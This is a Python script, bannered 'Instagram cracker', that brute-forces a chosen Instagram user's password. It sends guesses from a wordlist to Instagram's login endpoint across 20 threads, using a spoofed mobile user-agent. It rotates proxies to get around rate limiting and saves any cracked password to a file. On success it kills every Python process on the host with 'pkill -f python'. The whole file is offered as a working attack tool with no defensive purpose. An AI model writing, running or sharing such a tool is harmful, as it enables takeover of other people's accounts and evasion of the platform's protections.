import requests
import os
import sys
from concurrent.futures import ThreadPoolExecutor

TIMEOUT = 10 
THREADS = 20 
RED = "\033[1;31m"
RESET = "\033[0m"

def clear():
    os.system('clear')

def r_print(text):
    print(f"{RED}{text}{RESET}")

def banner():
    banner_text = r"""
  _       _    ___  _  ___ ___ 
 _| | ___ | |_ | __>| || . \| __>
/ . |/ ._>| . \| _> | ||   /| _> 
\___|\___.|___/|_|  |_||_\_\|___>                  
                                           
Instagram cracker
    """
    r_print(banner_text)

def attempt_login(target_user, password, proxy):
    url = "https://www.instagram.com/accounts/login/ajax/"
    
    headers = {
        "User-Agent": "Instagram 213.0.0.12.117 Android (26/4.4.2; 480dpi; 1080x1920; Samsung SM-G900F; Roast; build/KOT49G; 1080x1920; samsung; 4.4.2; 26; 123456789)",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Referer": "https://www.instagram.com/accounts/login/"
    }
    
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    
    data = {
        "username": target_user,
        "pwd": password
    }

    try:
        session = requests.Session()
        response = session.post(url, data=data, headers=headers, proxies=proxy_dict, timeout=TIMEOUT)
        
        if response.status_code == 200:
            if '"authenticated":true' in response.text:
                return True, password
            elif '"checkpoint_required":true' in response.text:
                return "checkpoint", password
            elif '"error":"password_not_hash"' in response.text or 'wrong password' in response.text.lower():
                return False, None
        elif response.status_code == 429:
            return "rate_limit", proxy
            
    except Exception:
        return "proxy_dead", proxy
    
    return False, None

def main():
    clear()
    banner()

    sys.stdout.write(f"{RED}Enter Target Instagram Username: {RESET}")
    target_user = input()
    sys.stdout.write(f"{RED}Enter Path to Password List: {RESET}")
    pass_list_file = input()
    sys.stdout.write(f"{RED}Enter Path to Proxy List: {RESET}")
    proxy_list_file = input()

    if not os.path.exists(pass_list_file) or not os.path.exists(proxy_list_file):
        r_print("\n[!] Error: Files not found!")
        return

    with open(pass_list_file, 'r', encoding='utf-8') as f:
        passwords = f.read().splitlines()
    with open(proxy_list_file, 'r', encoding='utf-8') as f:
        proxies = f.read().splitlines()

    if not passwords or not proxies:
        r_print("\n[!] Error: Lists are empty!")
        return

    r_print(f"\n[*] Loaded {len(passwords)} passwords and {len(proxies)} proxies.")
    r_print(f"[*] Attacking with {THREADS} threads...\n")

    def get_combinations():
        for i in range(len(passwords)):
            yield (target_user, passwords[i], proxies[i % len(proxies)])

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        future_to_pass = {executor.submit(attempt_login, *comb): comb for comb in get_combinations()}
        
        try:
            for future in future_to_pass:
                result, value = future.result()
                if result == True:
                    r_print(f"\n\n[+++] SUCCESS! Password Found: {value}")
                    with open("cracked.txt", "a") as f:
                        f.write(f"User: {target_user} | Pass: {value}\n")
                    os.system('pkill -f python') 
                    sys.exit()
                elif result == "checkpoint":
                    r_print(f"[!] Checkpoint triggered for: {value}")
                elif result == "rate_limit":
                    r_print(f"[!] Proxy {value} is rate-limited (429)")
                else:
                    sys.stdout.write(f"\r{RED}[*] Bruteforcing... (Searching for the key){RESET}")
                    sys.stdout.flush()
        except KeyboardInterrupt:
            r_print("\n[!] Attack aborted by user.")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        r_print(f"Critical Error: {e}")
          
